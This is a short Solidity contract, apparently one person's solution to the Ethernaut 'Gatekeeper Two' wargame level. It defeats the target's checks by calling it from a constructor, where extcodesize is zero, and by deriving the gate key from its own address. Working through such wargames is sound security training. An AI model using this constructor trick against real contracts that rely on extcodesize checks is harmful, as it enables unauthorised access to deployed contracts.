// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.3;

// Donnie Misino, 2022
// Ethernaught 14: Gatekeeper Two
// https://ethernaut.openzeppelin.com/level/0xdCeA38B2ce1768E1F409B6C65344E81F16bEc38d

contract GatekeeperTwo_Hack {
  constructor(address _gatekeeperTwoInstance) {
    // GatekeeperTwo contract requires extcodesize == 0, so attack from contructor which will pass that check
    bytes8 _gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (type(uint64).max));    
    address(_gatekeeperTwoInstance).call(abi.encodeWithSignature("enter(bytes8)", _gateKey));  
  }
}